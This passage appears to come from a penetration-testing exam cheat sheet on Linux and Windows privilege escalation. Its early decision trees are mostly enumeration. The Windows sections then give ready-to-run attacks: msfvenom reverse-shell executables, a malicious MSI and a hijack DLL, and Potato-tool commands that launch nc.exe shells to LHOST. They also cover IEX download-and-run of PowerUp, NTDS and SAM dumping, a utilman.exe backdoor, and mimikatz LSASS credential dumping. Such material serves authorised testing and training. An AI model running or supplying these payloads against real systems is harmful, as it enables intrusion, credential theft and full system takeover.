  └─ App plugin → plugin/config directory ownership
  ↓
Can user write a searched location or referenced dependency?
  ↓
Will privileged process load it during a reliable trigger?
  ├─ YES → HIGH priority
  └─ NO  → informational only



readelf -d /path/to/binary | grep -E 'RPATH|RUNPATH|NEEDED'
ldd /path/to/binary
find / -type d -writable 2>/dev/null | head -100
python3 -c 'import sys; print("\n".join(sys.path))' 2>/dev/null



Tree I — Writable root-owned script/configuration


WRITABLE FILE FOUND
  ↓
Who consumes it?
  ↓
Does a privileged process actually execute/read it?
  ├─ NO → probably noise
  └─ YES
       ↓
When/how is it triggered?
       ↓
Can one controlled value alter command/module/file behavior?
       ├─ YES → validate minimal effect
       └─ NO  → inspect downstream dependencies instead



ls -la /path/to/file
namei -l /path/to/file
ps auxww | grep -F '/path/to/file'
grep -R -F '/path/to/file' /etc/systemd /etc/cron* /etc/init.d 2>/dev/null



Tree J — Docker / LXC / LXD / host-resource control


CONTAINER / GROUP MEMBERSHIP
  ↓
What host resource is exposed?
  ├─ docker.sock / docker group
  ├─ privileged container
  ├─ host filesystem mount
  ├─ host PID namespace
  ├─ powerful capabilities
  └─ LXC/LXD management socket/group
  ↓
Can current identity ask the runtime to access host-controlled resources?
  ├─ YES → treat as host privilege boundary issue
  └─ NO  → being "inside Docker" alone is not escalation



id
ls -l /var/run/docker.sock 2>/dev/null
docker info 2>/dev/null
docker ps 2>/dev/null
cat /proc/1/cgroup
findmnt
cat /proc/self/status | grep '^Cap'



Tree K — NFS no_root_squash / network filesystem


NFS EXPORT
  ↓
Export writable from attacker-controlled client?
  ↓
no_root_squash or equivalent trust weakness?
  ↓
UID/GID semantics understood?
  ↓
Can a privileged-owned file/permission be created on the export?
  ├─ YES → strong escalation candidate
  └─ NO  → ordinary writable share only



cat /etc/exports 2>/dev/null
mount | grep -Ei 'nfs|cifs'
findmnt -t nfs,nfs4,cifs



Tree L — Kernel/package exploit: last resort


VERSION MATCH
  ↓
Exact distro build + package/kernel revision
  ↓
Architecture + required config/module/feature
  ↓
Exploit prerequisite reachable as current user?
  ↓
Mitigations/backports checked?
  ↓
Public reproducer matches target?
  ├─ YES → consider only after stable config/service paths
  └─ NO  → discard version-only match



Linux 10-second "worth pursuing?" test


For any candidate, answer these four questions:


1. What privileged process/user performs the action?
2. What exact input/file/path do I control?
3. What causes the privileged process to consume my input?
4. What minimal test proves the control without breaking the host?



If you cannot answer 1–3, keep enumerating instead of exploiting.

🛠️ 13.2 Services --- ACL + Binary + Registry + Path



✅ EXAM-COMPATIBLE · ✓ FIRST CHOICE · [REQ:LOCAL_SHELL] [REQ:WRITE_ACCESS] [REQ:TRIGGER]




[WIN:SERVICE]


Get-CimInstance Win32_Service |
  Select Name,StartMode,State,StartName,PathName

sc.exe query
sc.exe qc <SERVICE>



Check:


    

  • [ ] Unquoted service path
    • 

  • [ ] Writable executable
    • 

  • [ ] Writable parent directory
    • 

  • [ ] Weak service ACL
    • 

  • [ ] Weak registry ACL
    • 

  • [ ] Change-config/start permissions
    • 

  • [ ] SYSTEM service account
    • 

  • [ ] DLL/module dependencies
    • 



Use AccessChk to validate permissions rather than relying only on
WinPEAS.





📋 13.3 Scheduled Tasks & Autoruns



✅ EXAM-COMPATIBLE · ✓ when SYSTEM/high-privileged target is writable · [REQ:LOCAL_SHELL] [REQ:WRITE_ACCESS] [REQ:TRIGGER]




[WIN:TASK]


schtasks /query /fo LIST /v
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Check:


    

  • [ ] SYSTEM task
    • 

  • [ ] Writable executable/script
    • 

  • [ ] Writable working directory
    • 

  • [ ] DLL/module load
    • 

  • [ ] User-controlled arguments
    • 

  • [ ] Startup/logon trigger
    • 

  • [ ] Registry autorun binary writable
    • 






POTATO 13.4 Token Impersonation / Potato Decision Tree



✅ EXAM-COMPATIBLE MANUAL PATH · ✓ when prerequisites match · [REQ:LOCAL_SHELL] [REQ:PRIVILEGE] [REQ:EXACT_BUILD]




[WIN:SEIMPERSONATE]


whoami /priv
whoami /groups



If relevant:


SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
        ↓
Windows build
        ↓
Service/RPC prerequisites
        ↓
Select compatible technique



Know the families:


GodPotato
PrintSpoofer
RoguePotato
JuicyPotato
SweetPotato



Do not assume one Potato works on every Windows release.





🔌 13.5 Named Pipes / IPC

[WIN:PIPE]


dir \\.\pipe\



PowerShell:


Get-ChildItem \\.\pipe\



Investigate:


    

  • [ ] Pipe name
    • 

  • [ ] Owning process
    • 

  • [ ] Security descriptor
    • 

  • [ ] Client/server role
    • 

  • [ ] Impersonation
    • 

  • [ ] Privileged service account
    • 

  • [ ] Triggerable privileged operation
    • 



Use Procmon/Process Explorer to correlate pipe activity with processes.

Certificates/private keys

      ↓

      ↓

      ↓

      ↓
Decryptable secret






💾 13.7 Windows Privileges --- Don't Stop at SeImpersonate



✅ EXAM-COMPATIBLE MANUAL VALIDATION · ✓/△ depends on the exact enabled privilege · [REQ:LOCAL_SHELL]




[WIN:PRIV]


whoami /priv



Review:


SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeDebugPrivilege
SeTakeOwnershipPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeCreateSymbolicLinkPrivilege



For each privilege ask:




What exact protected operation does this privilege permit in the
current context?







🗄️ 13.8 LAPS / Local Administrator Credential Discovery

[WIN:LAPS]


Check for:


Windows LAPS
Legacy Microsoft LAPS
Delegated read permissions
Computer-object password attributes
Password expiration metadata



In AD:


Who can read the LAPS password?
Who can modify the computer object?
Does the current principal have delegated read rights?



Do not assume "LAPS exists" means the current user can read the
password.





📂 13.9 DLL / EXE / PATH Hijacking

[WIN:DLL]


Use:

With Procmon look for:


NAME NOT FOUND

Check:


DLL search order
Writable application directories
Writable PATH directories
Missing DLLs
Side-loading
Unquoted paths
Writable working directories






↔ 13.10 Registry / ACL / File Permission Methodology

[WIN:REGISTRY]


reg query HKLM\SOFTWARE
reg query HKCU\SOFTWARE
icacls "C:\path"



Ask:


Can I modify the executable?
Can I modify its parent directory?
Can I change the service configuration?
Can I modify a registry value that a privileged process consumes?
Can I influence a DLL/config/plugin?






🔐 13.11 SeBackup / SeRestore / Sensitive File Access

[WIN:BACKUP]


Relevant privileges:


SeBackupPrivilege
SeRestorePrivilege



Investigate whether the context allows access to:


SAM
SYSTEM
SECURITY
NTDS.dit
shadow copies
protected application files
registry hives



The key is to understand the privilege's semantics rather than
memorizing a single command.





💣 13.12 Kernel / Driver CVE Triage



✅ MANUAL EXPLOITATION MAY BE EXAM-COMPATIBLE · ! LAST RESORT · [REQ:LOCAL_SHELL] [REQ:EXACT_BUILD] [REQ:CONFIG] [REQ:SAFE_RECOVERY]




[WIN:KERNEL]


systeminfo
powershell -NoProfile -Command "Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20 HotFixID,InstalledOn,Description"
driverquery /v

REM △ LEGACY FALLBACK — WMIC is deprecated/absent on newer Windows:
wmic qfe list brief



Workflow:


OS name
  ↓
Build number
  ↓
Patch level
  ↓
Installed drivers
  ↓
Exact affected build
  ↓
Exploit prerequisites
  ↓
Mitigations
  ↓
Public PoC



Use Microsoft MSRC + NVD + vendor advisories.





📌 13.13 2026 Windows / AD CVE Reference --- Validate Before Use

● CONDITIONAL V19 rule: the product area in a CVE title does not tell you LOCAL vs REMOTE. Fill the CVE Context Card before acting. CVE-2026-26128 is LOCAL EoP (authorized low-priv attacker), not remote SMB RCE; port 445 alone is not a prerequisite.




CVE                    Area                   Checklist action




CVE-2026-26128         Windows SMB Server     Verify exact Windows
build and SMB context


CVE-2026-62752         Windows Kerberos       Verify exact build and
required authentication
context


CVE-2026-62773         Windows Kerberos       Verify exact build and
trigger conditions


CVE-2026-62766         Windows Kerberos       Verify exact build and
trigger conditions


CVE-2026-27912         Windows Kerberos       Check
network/authentication
prerequisites


CVE-2026-47288         Windows Kerberos       Check adjacent-network
prerequisites


CVE-2026-54121         AD CS                  Check
certificate-service
configuration


CVE-2026-55001         Active Directory       Check affected AD
configuration/build


Primary sources:


    

  • https://msrc.microsoft.com/
    • 

  • https://nvd.nist.gov/
    • 





Keep this as a triage index. Do not infer exploitability from a CVE
title.

➜ 13.15 Windows Practical Attack Trees --- Finding → Validation → Path

[WIN:TREE]


Use these after the Windows 60-second pass. Prioritize a path only when you can identify privileged context + controllable object + trigger.


Priority rule


HIGH    = SYSTEM/admin execution + writable/configurable object + restart/trigger
MEDIUM  = privilege/control exists but trigger or prerequisite is uncertain
LOW     = product/build match only or scanner finding without confirmed control



Tree A — SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege


whoami /priv
  ↓
SeImpersonate OR SeAssignPrimaryToken enabled?
  ├─ NO → move to other privileges
  └─ YES
       ↓
Exact Windows build + current service identity
       ↓
Which coercion/impersonation prerequisite is available?
       ├─ Compatible named-pipe/service path → PrintSpoofer-style family
       ├─ Compatible RPC/DCOM path          → Potato-family candidate
       └─ No usable trigger                 → privilege alone is not enough
       ↓
Choose technique for THIS build/context
       ↓
Validate with `whoami` / token identity before doing anything else



whoami /all
whoami /priv
systeminfo
whoami /groups



Mental shortcut: SeImpersonate → build → service/RPC prerequisite → compatible family → identity check.


Tree B — Weak Windows service


SERVICE RUNS AS SYSTEM / PRIVILEGED ACCOUNT
  ↓
sc qc + service ACL + binary/path ACL
  ↓
Can user control...
  ├─ service configuration?  → binPath/config-change path
  ├─ service executable?     → executable replacement path
  ├─ parent directory?       → replacement/path opportunity
  ├─ registry parameters?    → service-specific config path
  ├─ unquoted path segment?  → Tree C
  └─ DLL/config dependency?  → Tree E
  ↓
Can service be restarted OR will it naturally restart?
  ├─ YES → HIGH priority
  └─ NO  → determine realistic trigger before modification



sc qc <SERVICE>
sc query <SERVICE>
icacls "C:\path\to\service.exe"
icacls "C:\path\to"



Use AccessChk where available to confirm service-control permissions rather than trusting scanner output alone.


Tree C — Unquoted service path


UNQUOTED PATH WITH SPACES
  ↓
Service account privileged?
  ↓
Enumerate each executable resolution candidate
  ↓
Can user CREATE/WRITE any earlier candidate location?
  ├─ YES → candidate
  └─ NO  → not exploitable merely because path is unquoted
  ↓
Can service be restarted / machine reboot naturally?
  ├─ YES → validate path resolution safely
  └─ NO  → lower priority



sc qc <SERVICE>
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Vendor App"



Tree D — Scheduled task


TASK RUNS AS SYSTEM / ADMIN
  ↓
What executable/script/arguments run?
  ↓
Can current user write...
  ├─ executable/script?
  ├─ working directory?
  ├─ referenced config/file?
  ├─ relative command/DLL search location?
  └─ arguments through another controlled file?
  ↓
Can task be run manually OR does trigger occur soon?
  ├─ YES → HIGH priority
  └─ NO  → record trigger and continue enumeration



schtasks /query /fo LIST /v
icacls "C:\path\to\task.exe"



PowerShell:


Get-ScheduledTask | ForEach-Object {
  $t = $_
  $t.Actions | Select-Object @{n='Task';e={$t.TaskName}}, Execute, Arguments, WorkingDirectory
}



Tree E — DLL / EXE / PATH hijack


PRIVILEGED PROCESS ATTEMPTS LOAD/EXECUTE
  ↓
Procmon: NAME NOT FOUND / PATH NOT FOUND / search behavior
  ↓
Is searched location writable by current user?
  ├─ NO → discard
  └─ YES
       ↓
Does privileged process load from that location before trusted location?
       ↓
Can process/service/task be triggered reliably?
       ├─ YES → strong candidate
       └─ NO  → lower priority



where.exe <binary>
icacls "C:\candidate\directory"



Procmon filters worth using:


Process Name is <target>
Result is NAME NOT FOUND
Result is PATH NOT FOUND
Operation is CreateFile / Load Image / Process Create



Tree F — Registry / Autorun / installer policy


REGISTRY FINDING
  ↓
AlwaysInstallElevated?
  ├─ both HKCU + HKLM enabled → privileged installer policy candidate
  └─ otherwise continue
  ↓
Autorun/service registry entry points to privileged executable?
  ↓
Can user change registry value OR write referenced binary?
  ├─ YES → candidate
  └─ NO  → informational only
  ↓
Is there a realistic logon/start/restart trigger?



reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run



Tree G — SeBackupPrivilege / SeRestorePrivilege


SENSITIVE FILE PRIVILEGE
  ↓
Is privilege present/enabled in current token?
  ↓
What protected material is reachable?
  ├─ local SAM + SYSTEM
  ├─ SECURITY / application secret stores
  ├─ shadow-copy content
  └─ domain-controller NTDS only if actually on/able to access a DC context
  ↓
Can data be copied/read using the privilege?
  ├─ YES → credential/access path
  └─ NO  → privilege may be filtered/unusable in current context



whoami /priv
vssadmin list shadows
reg query HKLM\SAM



Avoid assuming SeBackupPrivilege = SYSTEM; first establish what protected data it lets the current process read.


Tree H — SeDebugPrivilege / ownership-style privileges


SeDebug / SeTakeOwnership / related privilege
  ↓
Is it enabled and usable by current token?
  ↓
What privileged process/object is actually accessible?
  ↓
Can the privilege produce a meaningful read/write/control primitive?
  ├─ YES → validate minimal primitive
  └─ NO  → privilege name alone is not an exploit



whoami /priv
tasklist /v



Tree I — DPAPI / Credential Manager / saved secrets


CREDENTIAL ARTIFACT FOUND
  ↓
What encryption/protection context?
  ├─ current-user DPAPI + current logon context
  ├─ machine DPAPI / SYSTEM context
  ├─ browser/app-specific encryption
  └─ plaintext/config/token already usable
  ↓
Do I possess the required masterkey/logon context?
  ├─ YES → attempt supported decryption/extraction path
  └─ NO  → collect metadata and search for alternate key/context
  ↓
Test recovered credential against in-scope services where appropriate



Useful enumeration:


cmdkey /list
dir /a "%APPDATA%\Microsoft\Credentials" 2>nul
dir /a "%LOCALAPPDATA%\Microsoft\Credentials" 2>nul



Tree J — LAPS / local administrator secrets in AD context


DOMAIN-JOINED HOST + DOMAIN CREDENTIAL
  ↓
Is Windows LAPS / legacy LAPS deployed?
  ↓
Can current principal read the password attribute for any computer?
  ├─ YES → identify exactly which computer + expiration + account
  └─ NO  → enumerate delegated groups/ACLs instead of guessing
  ↓
Credential valid for target computer?
  ├─ YES → local-admin path on that computer
  └─ NO  → check rotation/target/account mismatch



Do not treat “LAPS exists” as a finding; read permission to a relevant password attribute is what matters.


Tree K — Named pipe / IPC finding


INTERESTING NAMED PIPE
  ↓
Which process owns/exposes it?
  ↓
Does privileged process accept client-controlled interaction?
  ↓
Pipe ACL + impersonation behavior + trigger
  ↓
Can interaction produce privileged token/action?
  ├─ YES → map to compatible impersonation technique
  └─ NO  → ordinary IPC; move on



Get-ChildItem \\.\pipe\



Correlate with Process Explorer/Procmon when possible.


Tree L — Driver / kernel CVE: last resort


WINDOWS BUILD / DRIVER MATCH
  ↓
Exact build + patch level + architecture
  ↓
Exact vulnerable driver/version present?
  ↓
Required device/interface reachable as current user?
  ↓
Mitigations + exploit prerequisites confirmed?
  ↓
Stable public reproducer for same build?
  ├─ YES → consider after service/config/credential paths
  └─ NO  → discard scanner/version-only result



systeminfo
powershell -NoProfile -Command "Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10 HotFixID,InstalledOn"
driverquery /v
REM Full triage + WMIC fallback: search [WIN:KERNEL]



Windows 10-second "worth pursuing?" test


For every candidate, answer:


1. Which privileged identity executes/owns the vulnerable action?
2. What exact service/file/registry/task/token object can I control?
3. Can I trigger it now or predict the natural trigger?
4. What minimal identity/permission check proves the hypothesis?



If privileged context + control + trigger are not all present, keep enumerating.








WIN 13.0 Windows Post-Shell Workflow — Save, Read, Validate, Re-enumerate

[WIN:WORKFLOW] [WIN:TREE]


CORE: The purpose of this workflow is to prevent two common mistakes: running automated enumeration without reading it, and jumping to kernel/CVE exploitation before checking simpler privilege, credential, service and task paths.


WINDOWS SHELL
  ↓
BASELINE identity / privileges / OS / network
  ↓
QUICK FILESYSTEM TRIAGE (C:\, Users, Program Files, ProgramData)
  ↓
PRIVESCHECK / WINPEAS / SEATBELT → SAVE OUTPUT → READ IT
  ↓
CREDENTIALS / HISTORY / CONFIG / SAVED CREDS
  ↓
TOKEN PRIVILEGES
  ↓
SERVICES → TASKS → AUTORUNS / INSTALLER POLICY
  ↓
LOCAL-ONLY LISTENERS + NON-DEFAULT SOFTWARE / CUSTOM BINARIES
  ↓
EXACT HYPOTHESIS: privileged actor + controlled object + trigger
  ↓
VALIDATE → EXPLOIT
  ↓
NEW IDENTITY? START THIS LOOP AGAIN
  ↓
DRIVER / KERNEL / PATCH CVE LAST



Baseline


whoami /all
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
ipconfig /all
route print
netstat -ano
net user %USERNAME%
net localgroup administrators



Fast filesystem triage


dir C:\ /a
tree /F /A C:\Users
dir "C:\Program Files"
dir "C:\Program Files (x86)" 2>nul
dir C:\ProgramData /a



Focus on non-default folders, other readable user profiles, application data, custom services, web roots, backup/config files and anything that explains an installed process/listener.


Automated pass — output is evidence, not decoration


Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck | Tee-Object privesccheck.txt
.\winPEASx64.exe | Tee-Object winpeas.txt
.\Seatbelt.exe -group=all > seatbelt.txt



Read saved output in this order: credentials → privileges → services → tasks → registry/installer/autoruns → installed applications/internal listeners → patch/kernel suggestions.


Credential pass


cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
for /d %u in (C:\Users\*) do @type "%u\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul
dir /s /b C:\Windows\Panther\*unattend* 2>nul
dir /s /b C:\inetpub\wwwroot\web.config 2>nul



Also inspect service/application configuration under Program Files/ProgramData/AppData and readable profiles. A newly recovered credential must immediately enter the Credential Debt/fan-out workflow.


Services and tasks


Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName
schtasks /query /fo LIST /v
Get-ScheduledTask | Select-Object TaskName,TaskPath,State



For each candidate verify: privileged account → writable binary/config/directory/ACL → ability to start/restart/trigger (or a predictable natural trigger).


Local-only listeners and software


Get-NetTCPConnection -State Listen | Sort-Object LocalPort | Format-Table LocalAddress,LocalPort,OwningProcess
Get-Process | Select-Object Id,ProcessName,Path
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* 2>$null | Select DisplayName,DisplayVersion,InstallLocation
Get-ItemProperty HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* 2>$null | Select DisplayName,DisplayVersion,InstallLocation



If a service only listens on loopback, test it from the target itself and correlate the PID with the application/config. Do not ignore a high-value service merely because Kali cannot reach it directly.


Re-enumeration trigger


NEW USER / NEW GROUP / ADMIN / SYSTEM / NEW CREDENTIAL / NEW ROUTE
  → whoami /all again
  → repeat credential visibility checks
  → repeat listeners/services/tasks
  → if domain joined, re-enumerate AD with the new identity



Kernel / driver / missing patch


Last resort after the higher-signal configuration paths. Confirm exact build, architecture, patch level, driver/component, exploit prerequisites and crash/recovery plan before testing.





13. PRIVILEGE ESCALATION --- WINDOWS (EVERY VECTOR)



⚙ 13.1 Automated Tools --- Run These First

# ── WINPEAS (BEST for Windows) ────────────────────────────────
.\winPEASx64.exe
.\winPEASx86.exe           # 32-bit systems
.\winPEASany.exe | Tee-Object winpeas.txt

# ── POWERUP ───────────────────────────────────────────────────
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/PowerUp.ps1')
Invoke-AllChecks | Out-File -Encoding ASCII powerup_results.txt

# ── SEATBELT ──────────────────────────────────────────────────
.\Seatbelt.exe -group=all
.\Seatbelt.exe CredEnum WindowsCredentialFiles TokenPrivileges

# ── SHARPUP ───────────────────────────────────────────────────
.\SharpUp.exe audit

# ── WATSON (patch-based privesc) ──────────────────────────────
.\Watson.exe    # Shows exploitable missing patches

# ── QUICK MANUAL CHECK ────────────────────────────────────────
whoami /priv
whoami /groups
net user %username%
net localgroup administrators
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
powershell -NoProfile -Command "Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10 HotFixID,InstalledOn"
REM △ Older Windows fallback: wmic qfe list brief






🛤️ 13.2 Service Exploits

REM ── UNQUOTED SERVICE PATH ────────────────────────────────────
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
REM PowerShell:
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | Select Name,PathName,StartMode

REM Example: C:\Program Files\Vulnerable App\service.exe
REM Try placing payload at: C:\Program.exe
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o "C:\Program.exe"
sc start VulnService

REM ── WEAK SERVICE PERMISSIONS ──────────────────────────────────
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
.\accesschk.exe /accepteula -uwcqv "Everyone" *
.\accesschk.exe /accepteula -uwcqv Users *
REM If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG:
sc config VulnService binPath= "C:\Users\Public\shell.exe"
sc stop VulnService && sc start VulnService

REM ── WRITABLE SERVICE BINARY ────────────────────────────────────
icacls "C:\path\to\service.exe"
REM If (W) write access:
copy /y shell.exe "C:\path\to\service.exe"
sc stop VulnService && sc start VulnService






📋 13.3 Registry & AlwaysInstallElevated

REM ── ALWAYSINSTALLELEVATED ──────────────────────────────────────
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
REM Both = 0x1 → create malicious MSI:
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi

REM ── AUTORUNS WITH WEAK PERMS ───────────────────────────────────
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
REM Check if any listed binary is writable:
icacls "C:\path\to\autorun.exe"
REM If writable → replace with shell

REM ── AUTOLOGON CREDENTIALS ──────────────────────────────────────
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword






POTATO 13.4 Token Impersonation --- Potato Attacks



✅ EXAM-COMPATIBLE MANUAL PATH · ✓ when prerequisites match · [REQ:LOCAL_SHELL] [REQ:PRIVILEGE] [REQ:EXACT_BUILD]




# ── CHECK PRIVILEGES ──────────────────────────────────────────
whoami /priv | findstr "SeImpersonatePrivilege\|SeAssignPrimaryTokenPrivilege"
# These are held by: IIS AppPool, MSSQL Service, Network Service accounts

# ── GODPOTATO (most universal — Windows 2012+) ────────────────
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "C:\Users\Public\nc.exe LHOST LPORT -e cmd"

# ── PRINTSPOOFER (Windows 10 / Server 2016, 2019) ─────────────
sc query Spooler    # Must be running
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "C:\Users\Public\nc.exe LHOST LPORT -e cmd"

# ── JUICYPOTATO (Windows < 10 1809 / Server 2016 and older) ───
# Need CLSID for OS: https://github.com/ohpe/juicy-potato/tree/master/CLSID
.\JuicyPotato.exe -l 1337 -p "cmd.exe" -a "/c net localgroup administrators user /add" -t * -c {CLSID}

# ── ROGUEPOTATO (Windows 10 1809+ / Server 2019) ──────────────
.\RoguePotato.exe -r LHOST -e "C:\Users\Public\nc.exe LHOST LPORT -e cmd" -l 9999

# ── SWEETPOTATO (combined) ────────────────────────────────────
.\SweetPotato.exe -a "whoami"
.\SweetPotato.exe -e EfsRpc -p C:\Users\Public\nc.exe -a "LHOST LPORT -e cmd"






💾 13.5 Sensitive Privilege Abuse

# ── SeBackupPrivilege → SAM/NTDS dump ────────────────────────
# Dump with diskshadow:
Set-Content -Path C:\Windows\Temp\s.dsh -Value "set context persistent nowriters`nadd volume c: alias tmp`ncreate`nexpose %tmp% z:"
diskshadow.exe /s C:\Windows\Temp\s.dsh
robocopy /b z:\Windows\NTDS\ C:\Windows\Temp\ ntds.dit
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
# Transfer to Kali → impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# ── SeRestorePrivilege → write any file ───────────────────────
# Overwrite utilman.exe with cmd.exe:
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# At Windows login screen → Win+U → cmd as SYSTEM

# ── SeDebugPrivilege → dump LSASS ────────────────────────────
# Mimikatz uses this:
privilege::debug
sekurlsa::logonpasswords

# ── SeLoadDriverPrivilege → kernel driver ────────────────────
# Load vulnerable signed driver (e.g. Capcom.sys) → SYSTEM






📂 13.6 DLL Hijacking

# ── FIND MISSING DLL OPPORTUNITIES ───────────────────────────
# Use Procmon on Windows: filter Result=NAME NOT FOUND + .dll in path
# Or use winpeas output which lists writable directories in PATH

# ── CREATE MALICIOUS DLL ─────────────────────────────────────
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f dll -o missing.dll

# C template (more reliable):
cat > evil.c << 'EOF'
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH)
        system("cmd /c \"C:\\Users\\Public\\nc.exe LHOST LPORT -e cmd\"");
    return TRUE;
}
EOF
x86_64-w64-mingw32-gcc -shared -o missing.dll evil.c -lws2_32

# DLL SEARCH ORDER (Windows):
# 1. Application directory  ← most common hijack location
# 2. System directory (C:\Windows\System32)
# 3. Windows directory (C:\Windows)
# 4. Current directory
# 5. PATH directories
